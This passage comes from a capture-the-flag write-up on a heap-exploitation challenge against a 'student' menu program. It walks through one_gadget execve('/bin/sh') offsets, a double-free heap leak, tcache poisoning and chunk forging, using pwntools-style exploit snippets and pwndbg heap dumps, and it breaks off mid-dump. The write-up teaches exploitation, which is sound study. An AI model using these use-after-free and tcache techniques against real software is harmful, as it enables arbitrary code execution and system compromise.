+</span></span><span style="display:flex;"><span>  rsp &amp; <span style="color:#033">0xf</span> <span style="color:#555">==</span> <span style="color:#f60">0</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#033">rcx</span> <span style="color:#555">==</span> NULL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x4f322 execve<span style="color:#555">(</span><span style="color:#c30">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span style="color:#555">)</span>
+</span></span><span style="display:flex;"><span>constraints:
+</span></span><span style="display:flex;"><span>  <span style="color:#555">[</span>rsp+0x40<span style="color:#555">]</span> <span style="color:#555">==</span> NULL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x10a38c execve<span style="color:#555">(</span><span style="color:#c30">&#34;/bin/sh&#34;</span>, rsp+0x70, environ<span style="color:#555">)</span>
+</span></span><span style="display:flex;"><span>constraints:
+</span></span><span style="display:flex;"><span>  <span style="color:#555">[</span>rsp+0x70<span style="color:#555">]</span> <span style="color:#555">==</span> NULL
+</span></span></code></pre></div><p>To use that gadget, we need to leak libc base address. In order to do that, we can&rsquo;t rely on the tcache bin. We need to find a way, so that during we call the <code>free</code>, the chunk got cached inside <code>unsortedbin</code>, because unsorted bin chunk will store pointer to libc <code>main_arena</code>. With UAF, we can leak the libc base address.
+How to do that? The main idea is we need to:</p>
+<ul>
+<li>Forge a chunk with size <code>0x90</code></li>
+<li>Free it 7 times (So that tcache[0x90] will be full)</li>
+<li>Free it one more time. And then our chunk will go to <code>unsortedbin</code> (If we use size smaller than 0x90, it will go to <code>fastbin</code>)</li>
+<li>Using UAF, we can print the chunk data (which contains the libc address of the <code>main_arena</code>)</li>
+<li>Reuse the pitfall solution, but instead of <code>getFlag</code> address, we store our shell gadget address</li>
+</ul>
+<p>Let&rsquo;s do that 😄</p>
+<h4 id="leak-heap-address">Leak heap address <a href="#leak-heap-address" class="anchor">#</a></h4>
+<p>In order to fulfill that, we need to find the heap_address first. We can use double free to retrieve the heap address:</p>
+<ul>
+<li>Create new student</li>
+<li>Free it (our chunk will go to tcache, and <code>tcache_entry-&gt;next</code> is null)</li>
+<li>Free it again (Because we free the same chunk, the single linked list of <code>tcache_entry</code> will create a loop. The tcache[0x20] will be like this<code>student_pointer-&gt;student_pointer-&gt;...</code>)</li>
+</ul>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Leak heap address by double-free</span>
+</span></span><span style="display:flex;"><span>new_student(<span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x10</span>)
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">2</span>): <span style="color:#09f;font-style:italic"># Double free</span>
+</span></span><span style="display:flex;"><span>    free_student()
+</span></span><span style="display:flex;"><span>out <span style="color:#555">=</span> print_student()
+</span></span><span style="display:flex;"><span>heap_address <span style="color:#555">=</span> u64(out<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leak heap address: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(heap_address)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Heap after creating new student named <code>aaaaaaaaaaaaaaaa</code></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; x/30gx 0x21a0260-0x10
+</span></span><span style="display:flex;"><span>0x21a0250:	0x0000000000000000	0x0000000000000021 &lt;- chunk size metadata
+</span></span><span style="display:flex;"><span>0x21a0260:	0x6161616161616161	0x6161616161616161 &lt;- chunk data
+</span></span><span style="display:flex;"><span>0x21a0270:	0x0000000000000000	0x0000000000020d91
+</span></span><span style="display:flex;"><span>0x21a0280:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0290:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02a0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02b0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02c0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02d0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02e0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02f0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0300:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0310:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0320:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0330:	0x0000000000000000	0x0000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>First free</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; x/30gx 0x21a0260-0x10
+</span></span><span style="display:flex;"><span>0x21a0250:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0260:	0x0000000000000000	0x6161616161616161 &lt;- This chunk become tcache_entry, and the first <span style="color:#f60">8</span> bytes point to the next tcache_entry, which is null because only <span style="color:#f60">1</span> entry <span style="color:#069;font-weight:bold">for</span> now
+</span></span><span style="display:flex;"><span>0x21a0270:	0x0000000000000000	0x0000000000020d91
+</span></span><span style="display:flex;"><span>0x21a0280:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0290:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02a0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02b0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02c0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02d0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02e0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02f0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0300:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0310:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0320:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0330:	0x0000000000000000	0x0000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Free it again</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; x/30gx 0x21a0260-0x10
+</span></span><span style="display:flex;"><span>0x21a0250:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0260:	0x00000000021a0260	0x6161616161616161 &lt;- Because of the double free, the tcache_entry single linked list create a loop
+</span></span><span style="display:flex;"><span>0x21a0270:	0x0000000000000000	0x0000000000020d91
+</span></span><span style="display:flex;"><span>0x21a0280:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0290:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02a0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02b0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02c0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02d0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02e0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a02f0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0300:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0310:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0320:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x21a0330:	0x0000000000000000	0x0000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, with UAF, we can print student info, which point to the <code>tcache_entry</code>, and we successfully leak the heap_address (via print student info menu).</p>
+<p>After that don&rsquo;t forget to empty the tcache. Set the <code>tcache_entry-&gt;next pointer</code> to null, so that when we create a new student, the tcache will be empty (because the next pointer is null). We can use menu 4 (edit student) to null it, because the <code>student_pointer</code> still point to our chunk data.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set tcache[0x20] to empty</span>
+</span></span><span style="display:flex;"><span>edit_student(p64(<span style="color:#f60">0</span>)) <span style="color:#09f;font-style:italic"># Make the current tcache_entry-&gt;next to null</span>
+</span></span><span style="display:flex;"><span>new_student(<span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># The malloc will use the cached chunk, and because the next is null, tcache[0x20] is now empty</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now our tcache is empty, and we are ready to create our forged chunk.</p>
+<h4 id="create-forged-chunk">Create forged chunk <a href="#create-forged-chunk" class="anchor">#</a></h4>
+<p>After finding the heap address, we can create our <code>0x91</code> forged chunk (by creating new student), and then later with double free + UAF, we can overwrite the pointer of tcache to point to our forged chunk. We just need to create a lot of chunk (via new student menu) where the name last byte is <code>0x91</code>. I create new student 6 times, so that the next of my fake chunk is not the wilderness (because if it is, it will get consolidated).</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># Populate heap because we will forge the chunk to 0x90 size (1 alloc = 0x20 bytes)
+</span></span><span style="display:flex;"><span># Make sure the next of our forged chunk is not the wilderness
+</span></span><span style="display:flex;"><span>for i in range(6):
+</span></span><span style="display:flex;"><span>    new_student(p64(0) + p64(0x91))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Heap structure after that:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; x/30gx 0x21a0260-0x10
+</span></span><span style="display:flex;"><span>0x21a0250:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0260:	0x6161616161616161	0x616161616161610a -&gt; Leaked heap address
+</span></span><span style="display:flex;"><span>0x21a0270:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0280:	0x0000000000000000	0x0000000000000091 --
+</span></span><span style="display:flex;"><span>0x21a0290:	0x0000000000000000	0x0000000000000021   |
+</span></span><span style="display:flex;"><span>0x21a02a0:	0x0000000000000000	0x0000000000000091   |
+</span></span><span style="display:flex;"><span>0x21a02b0:	0x0000000000000000	0x0000000000000021   |
+</span></span><span style="display:flex;"><span>0x21a02c0:	0x0000000000000000	0x0000000000000091   |-&gt; This is our fake chunk with size 0x91
+</span></span><span style="display:flex;"><span>0x21a02d0:	0x0000000000000000	0x0000000000000021   |
+</span></span><span style="display:flex;"><span>0x21a02e0:	0x0000000000000000	0x0000000000000091   |
+</span></span><span style="display:flex;"><span>0x21a02f0:	0x0000000000000000	0x0000000000000021   |
+</span></span><span style="display:flex;"><span>0x21a0300:	0x0000000000000000	0x0000000000000091 --
+</span></span><span style="display:flex;"><span>0x21a0310:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0320:	0x0000000000000000	0x0000000000000091 -&gt; student_pointer is currently pointing to this chunk
+</span></span><span style="display:flex;"><span>0x21a0330:	0x0000000000000000	0x0000000000020cd1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="make-student_pointer-to-point-the-forged-chunk">Make student_pointer to point the forged chunk <a href="#make-student_pointer-to-point-the-forged-chunk" class="anchor">#</a></h4>
+<p>Now we have prepare our forged chunk, now we need to make a pointer point to the chunk (<code>leaked_heap_address+0x30</code>) and then free it. The idea is to:</p>
+<ul>
+<li>Free the <code>student_pointer</code>. So that <code>tcache[0x20] = last_chunk</code></li>
+<li>Call edit student to overwrite the <code>tcache_entry-&gt;next</code> to our forged chunk (<code>leaked_heap_address+0x30</code>), so that <code>tcache[0x20] = last_chunk-&gt;heap_address+0x30</code></li>
+<li>Create new student. This will be allocated to our last chunk, and <code>tcache[0x20]</code> will point to <code>heap_address+0x30</code></li>
+<li>Create new student again. This student will be allocated to <code>heap_address+0x30</code> and now we have a pointer to our forged chunk that is ready to be freed.</li>
+</ul>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Free the last chunk</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite it with our desired address (heap_address + 0x30)</span>
+</span></span><span style="display:flex;"><span>free_student()
+</span></span><span style="display:flex;"><span>edit_student(p64(heap_address<span style="color:#555">+</span><span style="color:#f60">0x30</span>)) <span style="color:#09f;font-style:italic"># tcache[0x20] = last_chunk-&gt;heap_address+0x30</span>
+</span></span><span style="display:flex;"><span>new_student(<span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># Allocate it to last chunk. Now, tcache[0x20] = heap_address+0x30</span>
+</span></span><span style="display:flex;"><span>new_student(<span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># Allocate it to heap_address+0x30. Now, tcache[0x20] = empty and student_pointer point to heap_address+0x30</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Heap structure after that:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
